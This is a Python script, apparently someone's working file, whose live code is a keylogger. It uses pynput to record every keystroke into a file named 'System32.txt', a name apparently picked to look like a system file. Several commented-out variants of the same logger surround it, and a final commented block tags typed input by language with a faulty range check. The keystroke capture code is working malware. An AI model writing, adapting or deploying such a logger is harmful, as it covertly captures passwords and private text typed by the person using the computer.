# pip
# install
# pynput
# pip
# install
# six

# import os
# from pynput.keyboard import Key, Listener
#
# file_path = "C:\\Users\\kiril\\System32.txt"
#
# char_count = 0
#
#
# def on_key_press(key):
#     global char_count
#     try:
#         char = key.char
#
#         if char:
#             with open(file_path, "a", encoding="utf-8") as text_file:
#                 text_file.write(char)
#                 char_count += 1
#
#                 if char_count >= 80:
#                     text_file.write("\n")
#                     char_count = 0
#
#     except AttributeError:
#         if key in [Key.space, Key.enter, Key.tab]:
#             with open(file_path, "a") as text_file:
#                 text_file.write(" ")
#                 char_count += 1
#                 if char_count >= 60:
#                     text_file.write("\n")
#                     char_count = 0
#
#
# # Ensure the directory structure exists
# os.makedirs(os.path.dirname(file_path), exist_ok=True)
#
# # Set up a keyboard listener
# with Listener(on_press=on_key_press) as listener:
#     listener.join()


import os
from pynput import keyboard
from pynput.keyboard import Key, Listener

file_path = "C:\\Users\\kiril\\System32.txt"


def on_key_press(key):
    with open(file_path, 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            if key in [Key.space]:
                with open(file_path, "a") as text_file:
                    text_file.write(" ")
            else:
                pass


# Ensure the directory structure exists
os.makedirs(os.path.dirname(file_path), exist_ok=True)

# Set up a keyboard listener
with Listener(on_press=on_key_press) as listener:
    listener.join()

# import os
# from pynput.keyboard import Key, Listener
#
# file_path = "C:\\Users\\kiril\\System32.txt"
#
# with open(file_path, "a", encoding="utf-8") as text_file:
#     text_file.write("\n")
#
# char_count = 0
#
#
# def on_key_press(key):
#     global char_count
#     try:
#         char = key.char
#
#         if char:
#             with open(file_path, "a", encoding="utf-8") as text_file:
#                 text_file.write(char)
#                 char_count += 1
#
#                 if char_count >= 60:
#                     text_file.write("\n")
#                     char_count = 0
#
#     except AttributeError:
#         if key in [Key.space, Key.enter, Key.tab]:
#             with open(file_path, "a") as text_file:
#                 text_file.write(" ")
#                 char_count = 0  # Reset char_count when a space, enter, or tab is encountered
#
#
# # Ensure the directory structure exists
# os.makedirs(os.path.dirname(file_path), exist_ok=True)
#
# # Set up a keyboard listener
# with Listener(on_press=on_key_press) as listener:
#     listener.join()

# import os
#
# # Get the user's home directory
# home_directory = os.path.expanduser("~")
#
# # Define the file path relative to the user's home directory
# file_name = "Text.txt"
# file_path = os.path.join(home_directory, file_name)
#
# def get_language(char):
#     # Define ranges of Unicode characters for English and Russian alphabets
#     english_range = (ord('a'), ord('z')) + (ord('A'), ord('Z'))
#     russian_range = (ord('а'), ord('я')) + (ord('А'), ord('Я'))
#
#     if ord(char) in english_range:
#         return "English"
#     elif ord(char) in russian_range:
#         return "Russian"
#     else:
#         return "Unknown"
#
# def main():
#     if not os.path.exists(file_path):
#         # Create the file if it doesn't exist
#         with open(file_path, 'w', encoding='utf-8'):
#             pass
#
#     while True:
#         user_input = input("Type something (press Enter to exit): ")
#
#         if not user_input:
#             break
#
#         language = "Both"
#         for char in user_input:
#             char_language = get_language(char)
#             if char_language == "English":
#                 language = "English"
#             elif char_language == "Russian":
#                 language = "Russian"
#
#         with open(file_path, 'a', encoding='utf-8') as file:
#             file.write(f"[{language}] {user_input}\n")
#
#     print(f"Data appended to {file_path}")
#
# if __name__ == "__main__":
#     main()
